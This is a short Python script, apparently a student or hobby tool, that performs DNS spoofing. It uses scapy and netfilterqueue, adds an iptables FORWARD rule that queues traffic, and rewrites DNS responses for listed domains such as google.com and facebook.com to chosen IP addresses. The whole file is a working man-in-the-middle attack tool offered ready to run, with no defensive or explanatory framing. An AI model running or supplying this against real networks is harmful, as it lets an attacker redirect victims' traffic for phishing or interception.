#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Jan 31 13:05:12 2022

"""

import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue

os.system("clear")
print ("\n----------------------------------------------------")
print ("\n---------      D N S     S P O O F I N G     ---------")
print ("\n----------------------------------------------------\n")

class DnsSpoof:
    def __init__(self, hostDict, queueNum):
        self.hostDict = hostDict
        self.queueNum = queueNum
        self.queue = NetfilterQueue()

    def __call__(self):
        log.info("Spoofing DNS responses...")
        os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
        self.queue.bind(self.queueNum, self.callBack)
        try:
            self.queue.run()
        except KeyboardInterrupt:
            os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
            log.info("[!] iptables rule flushed")

    def callBack(self, packet):
        scapyPacket = IP(packet.get_payload())
        if scapyPacket.haslayer(DNSRR):
            try:
                log.info(f'[Original] {scapyPacket[DNSRR].summary()}')
                queryName = scapyPacket[DNSQR].qname
                if queryName in self.hostDict:
                    scapyPacket[DNS].an = DNSRR(rrname=queryName, rdata=self.hostDict[queryName])
                    scapyPacket[DNS].ancount = 1
                    del scapyPacket[IP].len
                    del scapyPacket[IP].chksum
                    del scapyPacket[UDP].len
                    del scapyPacket[UDP].chksum
                    log.info(f'[Modified] {scapyPacket[DNSRR].summary()}')
            except IndexError as error:
                log.error(error)
            packet.set_payload(bytes(scapyPacket))
        packet.accept()


if __name__ == '__main__':
    try:
        hostDict = {
            b"google.com.": "142.250.182.238",
            b"facebook.com.": "163.70.138.35",
            b"metbhujbalknowledgecity.ac.in.": "199.79.62.93"
        }
        queueNum = 0
        log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
        dnsSpoof = DnsSpoof(hostDict, queueNum)
        dnsSpoof()
    except OSError as error:
        log.error(error)

